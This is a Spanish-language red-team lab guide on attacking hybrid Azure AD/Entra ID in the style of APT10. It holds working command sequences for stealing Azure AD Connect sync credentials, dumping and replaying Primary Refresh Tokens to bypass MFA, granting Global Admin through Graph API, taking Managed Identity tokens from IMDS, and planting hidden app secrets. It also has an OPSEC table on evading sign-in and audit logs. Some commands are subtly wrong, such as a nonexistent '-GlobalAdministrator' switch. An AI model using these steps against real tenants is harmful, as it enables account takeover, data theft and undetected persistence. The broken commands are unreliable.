# Tradecraft — Operación AZURE BREACH
## Lab-14: Azure AD/Entra ID, PRT Theft y Hybrid AD Attacks

**Operación:** AZURE BREACH | **Adversario:** APT10 (Stone Panda) | **Nivel:** Enterprise Simulation  
**Autor:** Adrián Camacho | **Versión:** 1.0 | **Fecha:** Mayo 2026

---

## Índice

1. [Azure AD / Entra ID — Arquitectura](#1-azure-ad-entra-id)
2. [Hybrid AD — On-prem y Cloud conectados](#2-hybrid-ad)
3. [Azure AD Connect — El puente peligroso](#3-azure-ad-connect)
4. [Primary Refresh Token (PRT) — La credencial más valiosa](#4-primary-refresh-token)
5. [Enumeración de Azure AD](#5-enumeración-de-azure-ad)
6. [Privilege Escalation en Azure](#6-privilege-escalation-en-azure)
7. [OPSEC — APT10 en entornos cloud híbridos](#7-opsec)

---

## 1. Azure AD / Entra ID — Arquitectura

### ¿Qué es Azure AD (ahora Entra ID)?

Microsoft renombró Azure AD como **Microsoft Entra ID** en 2023, pero el término "Azure AD" sigue siendo ampliamente usado. Es el servicio de identidad cloud de Microsoft — el equivalente de AD DS (Active Directory Domain Services) en la nube.

### Diferencias fundamentales con AD on-prem

| AD on-prem (AD DS) | Azure AD / Entra ID |
|-------------------|---------------------|
| Kerberos + NTLM | OAuth 2.0 + OIDC + SAML |
| LDAP para queries | Microsoft Graph API |
| GPOs para políticas | Conditional Access Policies |
| OUs para organización | Administrative Units |
| Domain Controllers | Sin equivalente (managed service) |
| Objetos: usuarios, equipos, grupos | + Aplicaciones, Service Principals, Managed Identities |

### Objetos únicos de Azure AD

| Objeto | Descripción | Relevancia para Red Team |
|--------|-------------|--------------------------|
| **Application** | Representación de una app registrada | Puede tener permisos Graph API potentes |
| **Service Principal** | Identidad de una app en un tenant | Puede tener roles privilegiados |
| **Managed Identity** | Identidad automática para recursos Azure | Puede acceder a otros recursos sin credenciales |
| **Conditional Access Policy** | Controla cuándo/cómo se autentica | Bypassable en ciertos escenarios |
| **PRT** | Primary Refresh Token | Permite SSO sin contraseña |

### Roles privilegiados en Azure AD

| Rol | Privilegio |
|-----|-----------|
| Global Administrator | Control total del tenant |
| Privileged Role Administrator | Gestiona otros roles |
| Application Administrator | Crea/modifica aplicaciones |
| Cloud App Security Administrator | — |
| Exchange Administrator | Control de Exchange Online |

---

## 2. Hybrid AD — On-prem y Cloud conectados

### ¿Qué es un entorno híbrido?

El 90% de las empresas en 2026 tienen entornos híbridos — AD on-prem sincronizado con Azure AD. Esto significa que una brecha en on-prem puede escalar a cloud y viceversa.

### Tipos de identidad híbrida

| Tipo | Descripción | Autenticación |
|------|-------------|--------------|
| **Synced** | Usuario on-prem sincronizado a Azure AD | Hash sincronizado o pass-through |
| **Cloud-only** | Solo existe en Azure AD | Siempre cloud |
| **Federated** | Autenticación delegada a ADFS | ADFS token |
| **Hybrid Joined** | Equipo unido a AD on-prem Y Azure AD | PRT + Kerberos |

### El path de escalada más peligroso

```
On-prem comprometido → Azure AD Connect comprometido → Global Admin en cloud
```

Si comprometemos on-prem y el servidor donde corre Azure AD Connect, podemos obtener las credenciales de sincronización que tienen permisos de Global Admin en Azure.

---

## 3. Azure AD Connect — El puente peligroso

### ¿Qué es Azure AD Connect?

Azure AD Connect es el software que sincroniza identidades entre AD on-prem y Azure AD. Se ejecuta en un servidor Windows del dominio on-prem y tiene acceso privilegiado a ambos entornos.

### Credenciales almacenadas en Azure AD Connect

El servidor de Azure AD Connect almacena:
1. **MSOL_** account — cuenta de servicio con privilegios de replicación en AD y permisos en Azure AD
2. **AADConnect** application — credenciales para conectar con el tenant de Azure AD

### Extracción de credenciales de Azure AD Connect

```powershell
# En el servidor de Azure AD Connect (requiere admin local)
# Herramienta: AADInternals

Import-Module AADInternals

# Obtener credenciales de sincronización
Get-AADIntSyncCredentials

# Output incluye:
# - UserName: MSOL_xxxxxxxx
# - Password: [contraseña generada automáticamente]
# - TenantID: [guid del tenant]
# - SyncClientId: [guid]
```

### Con las credenciales de MSOL_ → Global Admin en minutos

```powershell
# Autenticarse con las credenciales MSOL_
$cred = Get-Credential  # MSOL_xxxxxxxx / password

# Crear usuario Global Admin en Azure AD
Install-Module AzureAD
Connect-AzureAD -Credential $cred
New-AzureADUser -DisplayName "BackdoorAdmin" -PasswordProfile ... -GlobalAdministrator $true
```

---

## 4. Primary Refresh Token (PRT) — La credencial más valiosa

### ¿Qué es un PRT?

El Primary Refresh Token es una credencial especial emitida por Azure AD cuando un usuario se autentica en un dispositivo registrado en Azure AD (Hybrid Joined o Azure AD Joined). El PRT permite:

1. **SSO sin contraseña** — obtener tokens para cualquier app de Microsoft 365
2. **Bypass de MFA** — el PRT ya prueba que se autenticó con MFA anteriormente
3. **Acceso a recursos** — Teams, SharePoint, Exchange, Azure Portal, etc.

### Por qué el PRT es tan valioso

```
PRT → solicitar Access Token para cualquier app Microsoft 365
    → sin contraseña
    → sin MFA adicional
    → válido durante horas o días
```

Con el PRT del CEO podemos acceder a su email, Teams, SharePoint y Azure Portal **sin conocer su contraseña y sin necesitar el segundo factor**.

### Cómo se obtiene el PRT

El PRT se almacena en el dispositivo del usuario y está protegido por:
- **TPM** (Trusted Platform Module) si está disponible
- **DPAPI** si no hay TPM
- **Memoria del proceso** `lsass.exe` (en dispositivos Hybrid Joined)

### Extracción del PRT

```bash
# Desde un dispositivo Hybrid Joined comprometido (requiere SYSTEM)
# Herramienta: ROADtoken o SharpDump + AADInternals

# Opción 1: Mimikatz con módulo SSP
.\mimikatz.exe "token::elevate" "sekurlsa::cloudap" exit
# Extrae el PRT y la clave de sesión

# Opción 2: ROADtoken (más moderno)
.\ROADtoken.exe
# Output: PRT en base64
```

### Usar el PRT para obtener Access Tokens

```powershell
# Con AADInternals
Import-Module AADInternals

# Usar el PRT robado para obtener token de acceso
$prt = "eyJ0eXAiOi..." # PRT en base64
$prtKey = "..." # Clave de sesión del PRT

# Obtener Access Token para cualquier app
$token = Get-AADIntAccessTokenUsingPRT -PRTToken $prt -SessionKey $prtKey -Resource "https://graph.microsoft.com"

# Acceder a recursos con el token
Get-AADIntUsers -AccessToken $token
Get-AADIntEmails -AccessToken $token
```

---

## 5. Enumeración de Azure AD

### AzureHound — BloodHound para Azure

AzureHound es la herramienta equivalente a SharpHound/bloodhound-python pero para Azure AD. Recolecta datos del tenant y los importa en BloodHound para visualizar attack paths.

```bash
# Instalar AzureHound
./azurehound -u user@tenant.onmicrosoft.com -p password list --tenant "tenant-id" -o azurehound_output.json

# Importar en BloodHound CE
# Quick Upload → azurehound_output.json
```

### ROADtools — Análisis de Azure AD

```bash
# Recolectar datos del tenant
roadrecon gather -u user@tenant.onmicrosoft.com -p password

# Analizar con GUI
roadrecon gui
# Navegar a http://localhost:5000
```

### Microsoft Graph API — Enumeración manual

```bash
# Obtener token de acceso
az login
token=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv)

# Enumerar usuarios
curl -H "Authorization: Bearer $token" \
  "https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName,assignedLicenses"

# Enumerar grupos
curl -H "Authorization: Bearer $token" \
  "https://graph.microsoft.com/v1.0/groups"

# Enumerar aplicaciones con permisos peligrosos
curl -H "Authorization: Bearer $token" \
  "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appRoles/any()"
```

---

## 6. Privilege Escalation en Azure

### Rutas comunes de escalada en Azure AD

#### Application con permisos excesivos → Global Admin

Las aplicaciones registradas en Azure AD pueden tener permisos de Microsoft Graph API muy poderosos. Si comprometemos las credenciales de una aplicación con `Directory.ReadWrite.All` o `RoleManagement.ReadWrite.Directory`, podemos añadir nuestro usuario como Global Admin.

```bash
# Con credenciales de la aplicación (client_id + client_secret)
# Obtener token de la aplicación
curl -X POST "https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token" \
  -d "grant_type=client_credentials&client_id=APP_ID&client_secret=APP_SECRET&scope=https://graph.microsoft.com/.default"

# Añadir usuario como Global Admin
curl -X POST "https://graph.microsoft.com/v1.0/directoryRoles/GLOBAL_ADMIN_ROLE_ID/members/$ref" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"@odata.id":"https://graph.microsoft.com/v1.0/directoryObjects/USER_ID"}'
```

#### Managed Identity → acceso a recursos Azure

Las Managed Identities pueden tener roles en subscripciones de Azure. Si comprometemos un recurso con Managed Identity (una VM, Function App, etc.), podemos acceder a otros recursos Azure sin credenciales.

```bash
# Desde dentro de la VM con Managed Identity
# Obtener token del IMDS (Instance Metadata Service)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Usar el token para acceder a recursos Azure
# Si la Managed Identity tiene rol de Contributor → acceso completo a la suscripción
```

---

## 7. OPSEC — APT10 en entornos cloud híbridos

### APT10 (Stone Panda) y entornos cloud

APT10 es conocido por campañas contra MSPs (Managed Service Providers) que gestionan infraestructura cloud para múltiples clientes. Sus TTPs incluyen:

- Comprometer el MSP → acceder a todos sus clientes vía herramientas de gestión cloud
- Usar aplicaciones OAuth legítimas para persistencia (más difícil de detectar que usuarios nuevos)
- Exfiltración lenta via Graph API (parece tráfico de aplicación legítima)
- Persistencia via Service Principals con credenciales rotadas

### Señales de detección en Azure AD

| Acción | Señal en Azure AD Logs | Mitigación del atacante |
|--------|----------------------|------------------------|
| Login desde IP inusual | Sign-in logs — IP anomaly | Usar VPN residencial del país objetivo |
| PRT usado desde otro dispositivo | Device compliance failure | Usar el mismo dispositivo comprometido |
| Añadir Global Admin | Audit log — Add member to role | Usar aplicación OAuth en lugar de usuario |
| Acceso masivo a Graph API | Graph API audit logs | Espaciar las consultas, imitar patrones normales |
| Nueva aplicación registrada | Audit log — Add application | Modificar aplicación existente comprometida |

### Persistencia sigilosa en Azure AD

En lugar de crear usuarios nuevos (muy visible), usar:

1. **Añadir credenciales a aplicación existente** — añadir un client_secret a una aplicación comprometida
2. **Federated Identity Credentials** — configurar federación con un identity provider controlado por el atacante
3. **PRT con refresh** — el PRT dura 90 días con refresh — mantenerlo activo es persistencia duradera

```powershell
# Añadir client_secret a aplicación existente (silencioso)
Add-AzADAppCredential -ApplicationId "APP_ID" -EndDate (Get-Date).AddYears(1)
# El nuevo secret no invalida los anteriores — backdoor invisible
```

---

## Referencias

- [AADInternals — Juho Nurminen](https://github.com/Gerenios/AADInternals)
- [AzureHound GitHub](https://github.com/BloodHoundAD/AzureHound)
- [ROADtools](https://github.com/dirkjanm/ROADtools)
- [MITRE ATT&CK — APT10](https://attack.mitre.org/groups/G0045/)
- [Microsoft Identity Platform docs](https://docs.microsoft.com/en-us/azure/active-directory/develop/)
- [Dirkjan Mollema — Azure AD Attack & Defense](https://dirkjanm.io/)

---

*Operación AZURE BREACH — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*